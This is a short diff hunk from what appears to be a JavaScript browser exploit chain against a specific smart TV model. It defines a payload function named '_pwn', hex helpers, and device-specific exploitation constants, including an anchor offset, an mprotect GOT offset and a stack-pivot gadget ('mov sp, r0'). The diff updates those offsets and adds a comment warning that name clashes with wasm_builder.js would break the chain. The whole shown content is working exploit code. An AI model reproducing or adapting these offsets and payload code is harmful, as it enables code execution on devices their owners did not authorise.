@@ -72,7 +72,11 @@ window.runPayload_fn = async function _pwn() {
   function hx(n)  { return "0x" + (n >>> 0).toString(16); }
   function hx8(n) { let s = (n >>> 0).toString(16); while (s.length < 8) s = "0" + s; return "0x" + s; }
 
-  // ── Constantes medidas en ESTA TV (T-PTMxxxx-0090-2130) ───────────────────
+  // NOTE: wasm_builder.js (loaded before this script) defines hundreds of
+// script-scope names (kExpr*, kGCPrefix, ...). A `let kExpr...` or any
+// redeclaration here is a parse-time SyntaxError that kills the whole
+// page before the chain runs - pick distinct names.
+// ── Constantes medidas en ESTA TV (T-PTMxxxx-0090-2130) ───────────────────
   const ANCHOR_OFS      = 0x49a1cc0;   // was 0x49a2438
   const GOT_MPROTECT    = 0x526cfc4;   // was 0x526d748
   const PIVOT_OFS       = 0x1186088;   // was 0x1186288  (mov sp, r0)
